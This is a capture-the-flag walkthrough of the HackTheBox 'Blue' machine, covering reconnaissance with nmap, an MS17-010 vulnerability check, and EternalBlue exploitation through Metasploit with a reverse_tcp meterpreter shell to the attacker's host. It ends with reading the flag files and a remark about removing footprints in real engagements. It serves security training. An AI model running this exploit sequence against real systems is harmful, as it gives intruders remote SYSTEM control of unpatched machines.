# Blue

EternalBlue is a notorious Windows vulnerability that was first discovered in 2017 and has had a significant impact on computer security. This vulnerability primarily affects the Microsoft Windows operating system, particularly versions that lack the latest security updates. EternalBlue exploits a flaw in the Windows Server Message Block (SMB) protocol, which is used for sharing files and printers across a network. When exploited, it allows an attacker to remotely execute arbitrary code on a vulnerable system without user interaction.

One of the most infamous exploits that leveraged the EternalBlue vulnerability was the WannaCry ransomware attack in May 2017. WannaCry rapidly spread across the globe, infecting hundreds of thousands of computers in over 150 countries, causing widespread panic and financial damage. Microsoft subsequently released emergency patches to address the vulnerability, but many organizations had failed to apply these updates in a timely manner, highlighting the importance of regular system patching and updates to mitigate such threats.

EternalBlue serves as a stark reminder of the critical role that cybersecurity plays in today's interconnected world. It underscores the necessity of promptly applying security patches and maintaining up-to-date software to protect against the ever-evolving threats posed by cybercriminals.

## Initial Assesment

### HTB Machine: Blue

- **IP Address:** [The target's IP address will be different for each user, substitute with the one given on HTB]
- **Difficulty:** Easy
- **Operating System:** Windows

### Step 1: Reconnaissance

1. **Start with a Ping Sweep:**
   First, check if the target machine is up and reachable.
   ```bash
   ping -c 4 <target-ip>
   ```

2. **Port Scanning with Nmap:**
   Perform a full TCP scan to identify open ports and services.
   ```bash
   nmap -sC -sV -oA blue_initial <target-ip>
   ```
   **Flags:**
   - `-sC`: Runs default scripts.
   - `-sV`: Detects service versions.
   - `-oA`: Outputs in all formats (Nmap, Grepable, and XML).

   **Output:**
   ```
   PORT      STATE SERVICE      VERSION
   135/tcp   open  msrpc        Microsoft Windows RPC
   139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
   445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
   3389/tcp  open  ms-wbt-server Microsoft Terminal Services
   ```

   The critical port here is `445`, which is commonly associated with SMB (Server Message Block).

### Step 2: Vulnerability Analysis

1. **Search for SMB Vulnerabilities:**
   Given that port 445 is open, we’ll check for known vulnerabilities, specifically *EternalBlue* (MS17-010).
   ```bash
   nmap --script smb-vuln-ms17-010 -p445 <target-ip>
   ```

   **Expected Output:**
   ```
   Host is likely VULNERABLE to MS17-010!
   ```

### Step 3: Exploitation

1. **Use Metasploit to Exploit EternalBlue:**
   EternalBlue is a well-known vulnerability that allows remote code execution on Windows machines.

   - Start the Metasploit framework:
     ```bash
     msfconsole
     ```
   - Search for the EternalBlue exploit:
     ```bash
     search eternalblue
     ```
   - Use the exploit:
     ```bash
     use exploit/windows/smb/ms17_010_eternalblue
     ```
   - Set the target IP:
     ```bash
     set RHOSTS <target-ip>
     ```
   - Set the payload (reverse shell):
     ```bash
     set payload windows/x64/meterpreter/reverse_tcp
     ```
   - Set the local IP (your IP) and port for the reverse shell:
     ```bash
     set LHOST <your-ip>
     set LPORT 4444
     ```
   - Execute the exploit:
     ```bash
     exploit
     ```

   If successful, you will get a Meterpreter shell.

### Step 4: Post-Exploitation

1. **Check System Info:**
   ```bash
   sysinfo
   ```

2. **Enumerate Users:**
   ```bash
   getuid
   ```

3. **Privilege Escalation:**
   Since we already have SYSTEM-level access from the exploit, we do not need further privilege escalation.

### Step 5: Capture the Flags

1. **Locate the User Flag:**
   Navigate to the user’s Desktop and retrieve the `user.txt` flag.
   ```bash
   cd C:\Users\<username>\Desktop
   cat user.txt
   ```

2. **Locate the Root Flag:**
   Navigate to the Administrator’s Desktop and retrieve the `root.txt` flag.
   ```bash
   cd C:\Users\Administrator\Desktop
   cat root.txt
   ```

### Step 6: Clean Up

Since this is a practice environment, there's no need to clean up, but in a real engagement, removing your footprints is crucial.
